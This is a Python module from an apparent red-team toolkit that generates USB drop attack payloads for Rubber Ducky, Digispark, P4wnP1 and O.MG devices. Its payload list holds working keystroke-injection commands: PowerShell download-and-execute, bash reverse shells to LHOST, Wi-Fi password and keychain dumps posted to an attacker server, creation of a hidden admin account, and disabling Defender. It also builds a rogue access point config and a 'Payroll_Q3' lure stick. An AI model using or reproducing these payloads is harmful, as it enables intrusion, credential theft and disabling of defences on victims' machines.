# language: Python, file: Program/physical/usb_drop.py, target: Red Sky physical — USB drop payload generator
# Generates drop payloads for the common hardware:
#   - Rubber Ducky (hak5)         -> inject.bin from Ducky Script
#   - Digispark (ATtiny85)        -> Arduino .ino from Duckyscript subset
#   - P4wnP1 A.L.O.A (RPi Zero W) -> setup.cfg + payloads
#   - O.MG Cable                   -> Ducky Script for the web flasher
# Also writes an ISO/IMG "label" folder layout you can drop onto a USB stick
# for a badge-in-the-parking-lot scenario (autorun.inf + lure PDFs).

import json
import sys
import time
from pathlib import Path
from typing import Dict, List

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


PH_DIR = OUTPUT_DIR / "physical"
DROP_DIR = PH_DIR / "usb_drops"
DROP_DIR.mkdir(parents=True, exist_ok=True)


# ── payload library ──
# each payload is a dict: name, target_os, description, duckyscript (list of lines)
PAYLOADS: List[Dict] = [
    {
        "name": "windows_reverse_shell",
        "target_os": "windows",
        "description": "Opens PowerShell and calls back to your listener",
        "duckyscript": [
            "DELAY 1500",
            "GUI r",
            "DELAY 500",
            "STRING powershell -w hidden -nop -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/ps.ps1')\"",
            "ENTER",
        ],
    },
    {
        "name": "windows_wifi_dump",
        "target_os": "windows",
        "description": "Dumps every saved Wi-Fi password, POSTs to your server",
        "duckyscript": [
            "DELAY 1500",
            "GUI r",
            "DELAY 500",
            "STRING powershell -w hidden -c \"(netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object { $_.ToString().Split(':')[1].Trim() } | ForEach-Object { $p = netsh wlan show profile name=$_ key=clear; \\\"$_ : $((($p | Select-String 'Key Content') -split ':')[1])\\\" }) | Out-File $env:TEMP\\w.txt; Invoke-WebRequest -Uri http://LHOST:LPORT/w -Method Post -InFile $env:TEMP\\w.txt\"",
            "ENTER",
        ],
    },
    {
        "name": "windows_add_user",
        "target_os": "windows",
        "description": "Adds a local admin account with a known password",
        "duckyscript": [
            "DELAY 1500",
            "GUI r",
            "DELAY 500",
            "STRING cmd /c net user support hunter2 /add && net localgroup administrators support /add",
            "ENTER",
        ],
    },
    {
        "name": "windows_disable_defender",
        "target_os": "windows",
        "description": "Powers off Defender real-time protection (requires admin)",
        "duckyscript": [
            "DELAY 1500",
            "GUI r",
            "DELAY 500",
            "STRING powershell -w hidden -c \"Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true\"",
            "ENTER",
        ],
    },
    {
        "name": "macos_reverse_shell",
        "target_os": "macos",
        "description": "Opens Terminal and calls back",
        "duckyscript": [
            "DELAY 1500",
            "GUI SPACE",
            "DELAY 500",
            "STRING terminal",
            "ENTER",
            "DELAY 800",
            "STRING bash -i >& /dev/tcp/LHOST/LPORT 0>&1",
            "ENTER",
        ],
    },
    {
        "name": "macos_wifi_dump",
        "target_os": "macos",
        "description": "Dumps macOS keychain wifi passwords to a POST",
        "duckyscript": [
            "DELAY 1500",
            "GUI SPACE",
            "DELAY 500",
            "STRING terminal",
            "ENTER",
            "DELAY 800",
            "STRING security dump-keychain -d login.keychain > /tmp/kc.txt; curl -X POST --data-binary @/tmp/kc.txt http://LHOST:LPORT/kc; rm /tmp/kc.txt",
            "ENTER",
        ],
    },
    {
        "name": "linux_reverse_shell",
        "target_os": "linux",
        "description": "Opens a terminal and calls back",
        "duckyscript": [
            "DELAY 1500",
            "CTRL ALT t",
            "DELAY 800",
            "STRING bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'",
            "ENTER",
        ],
    },
]


def _ducky_to_arduino(lines: List[str]) -> str:
    """Very rough Ducky Script -> Digispark Arduino subset. Handles DELAY, STRING,
    ENTER, GUI, CTRL, ALT, SHIFT combos, and single keystrokes."""
    out = [
        "#include \"DigiKeyboard.h\"",
        "",
        "void setup() {",
        "  DigiKeyboard.sendKeyStroke(0);",
        "  DigiKeyboard.delay(1500);",
    ]
    for raw in lines:
        line = raw.strip()
        if not line:
            continue
        parts = line.split(" ", 1)
        cmd = parts[0].upper()
        arg = parts[1] if len(parts) > 1 else ""

        if cmd == "DELAY":
            out.append("  DigiKeyboard.delay(" + arg + ");")
        elif cmd == "STRING":
            escaped = arg.replace('"', '\\"')
            out.append('  DigiKeyboard.print("' + escaped + '");')
        elif cmd == "ENTER":
            out.append("  DigiKeyboard.sendKeyStroke(KEY_ENTER);")
        elif cmd == "GUI":
            key = _digispark_key(arg)
            out.append("  DigiKeyboard.sendKeyStroke(" + key + ", MOD_GUI_LEFT);")
        elif cmd == "CTRL":
            key = _digispark_key(arg)
            out.append("  DigiKeyboard.sendKeyStroke(" + key + ", MOD_CONTROL_LEFT);")
        elif cmd == "ALT":
            key = _digispark_key(arg)
            out.append("  DigiKeyboard.sendKeyStroke(" + key + ", MOD_ALT_LEFT);")
        elif cmd == "CTRL ALT":
            key = _digispark_key(arg)
            out.append("  DigiKeyboard.sendKeyStroke(" + key + ", MOD_CONTROL_LEFT | MOD_ALT_LEFT);")
        else:
            out.append("  // unhandled: " + line)
    out += [
        "}",
        "",
        "void loop() {}",
    ]
    return "\n".join(out)


def _digispark_key(s: str) -> str:
    s = s.strip().upper()
    if not s:
        return "0"
    if s == "R":
        return "KEY_R"
    if s == "SPACE":
        return "KEY_SPACE"
    if s == "T":
        return "KEY_T"
    if len(s) == 1:
        return "'" + s.lower() + "'"
    return "KEY_" + s


def _p4wnp1_config(lhost: str, lport: int, ssid: str) -> str:
    return f"""# P4wnP1 A.L.O.A — dual-mode attack: HID + rogue AP + reverse shell
# drop this at /boot/payloads/ on the RPi Zero W

GENERIC
set_fs_drive_path /boot/fs
set_dhcp_lease_time 3600

USB_SETTINGS
hid_backend usb_gadget
hid_raw_report_enable true

NETWORK_SETTINGS
set_ssid "{ssid}"
set_psk "hunter2hunter2"
set_dhcp_lease_time 3600

WIFI_SETTINGS
set_wlan_mode ap
set_channel 6
set_beacon_ssid "{ssid}"
set_beacon_encryption wpa2
set_beacon_passphrase "hunter2hunter2"

# reverse shell beacon
PAYLOAD
  # wait for host to mount HID, then fire
  sleep 3
  run_hid_script /boot/payloads/hid.txt
  # reverse shell
  bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1" &
"""


def _autorun_inf() -> str:
    return """[autorun]
open=README.pdf
icon=README.pdf,0
label=Payroll_Q3

[Content]
MusicFiles=0
PictureFiles=0
VideoFiles=0
"""


def _lure_readme() -> str:
    return """Payroll — Q3
================
Open Payroll_Q3.pdf to view.

If the PDF does not open automatically, double-click it.
"""


def cmd_list() -> int:
    print_info(str(len(PAYLOADS)) + " payloads available")
    print()
    for p in PAYLOADS:
        print("  " + SCARLET + "*" + RESET + " " + BONE + p["name"] + RESET)
        print("      " + ASH + "target: " + RESET + ARTERY + p["target_os"] + RESET
              + "  " + CLOT + p["description"] + RESET)
    return 0


def cmd_gen(payload_name: str, target: str, lhost: str, lport: int,
            out_name: str, ssid: str) -> int:
    if payload_name == "all":
        payloads = PAYLOADS
    else:
        payloads = [p for p in PAYLOADS if p["name"] == payload_name]
        if not payloads:
            print_err("unknown payload: " + payload_name)
            print_info("available: " + ", ".join(p["name"] for p in PAYLOADS) + ", all")
            return 2

    bundle = DROP_DIR / (out_name or "drop_" + str(int(time.time())))
    bundle.mkdir(parents=True, exist_ok=True)

    print_info("generating " + str(len(payloads)) + " payload(s) -> " + str(bundle))
    print_kv("lhost", lhost)
    print_kv("lport", str(lport))
    print_kv("target format", target)
    print()

    for p in payloads:
        # substitute LHOST/LPORT placeholders
        lines = []
        for raw in p["duckyscript"]:
            line = raw.replace("LHOST", lhost).replace("LPORT", str(lport))
            lines.append(line)

        if target in ("ducky", "omg", "all"):
            txt = bundle / (p["name"] + ".txt")
            txt.write_text("\n".join(lines) + "\n", encoding="utf-8")
            print_ok("ducky script: " + str(txt))

        if target in ("digispark", "all"):
            ino = bundle / (p["name"] + ".ino")
            ino.write_text(_ducky_to_arduino(lines), encoding="utf-8")
            print_ok("arduino sketch: " + str(ino))

        if target in ("p4wnp1", "all"):
            cfg = bundle / ("p4wnp1_" + p["name"] + ".cfg")
            cfg.write_text(_p4wnp1_config(lhost, lport, ssid or "FreeWiFi"), encoding="utf-8")
            print_ok("p4wnp1 config: " + str(cfg))

        # metadata json for the payload
        meta = bundle / (p["name"] + ".meta.json")
        meta.write_text(json.dumps({
            "payload": p["name"],
            "target_os": p["target_os"],
            "description": p["description"],
            "lhost": lhost,
            "lport": lport,
            "ducky_lines": lines,
        }, indent=2), encoding="utf-8")

    # USB stick bait layout
    stick = bundle / "stick"
    stick.mkdir(exist_ok=True)
    (stick / "autorun.inf").write_text(_autorun_inf(), encoding="utf-8")
    (stick / "README.txt").write_text(_lure_readme(), encoding="utf-8")
    print_ok("usb stick bait layout: " + str(stick))

    print()
    print_info("next steps:")
    if target in ("ducky", "omg", "all"):
        print_info("  - load the .txt into Hak5 Ducky Encoder or the O.MG web flasher")
    if target in ("digispark", "all"):
        print_info("  - open the .ino in Arduino IDE with the Digistump board package, flash")
    if target in ("p4wnp1", "all"):
        print_info("  - drop the .cfg at /boot/payloads/ on the Pi Zero W, reboot")
    print_info("  - start your listener: nc -lvnp " + str(lport))
    print_kv("bundle", bundle)
    return 0


def run_cli(args):
    import argparse
    p = argparse.ArgumentParser(prog="redsky physical usb_drop", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="gen", choices=["gen", "list"])
    p.add_argument("payload", nargs="?", default="all")
    p.add_argument("--target", default="all", choices=["ducky", "digispark", "p4wnp1", "omg", "all"])
    p.add_argument("--lhost", default="10.0.0.1")
    p.add_argument("--lport", type=int, default=4444)
    p.add_argument("--out", default="")
    p.add_argument("--ssid", default="FreeWiFi")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky physical usb_drop <gen|list> [payload-name|all] [--target ducky|digispark|p4wnp1|all] --lhost X --lport Y")
        return 2

    if ns.help:
        print_info("list                                  -- show payload catalog")
        print_info("gen all --target all --lhost 10.0.0.1 --lport 4444")
        print_info("gen windows_reverse_shell --target ducky --lhost 10.0.0.1")
        return 0

    if ns.action == "list":
        return cmd_list()
    return cmd_gen(ns.payload, ns.target, ns.lhost, ns.lport, ns.out, ns.ssid)


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
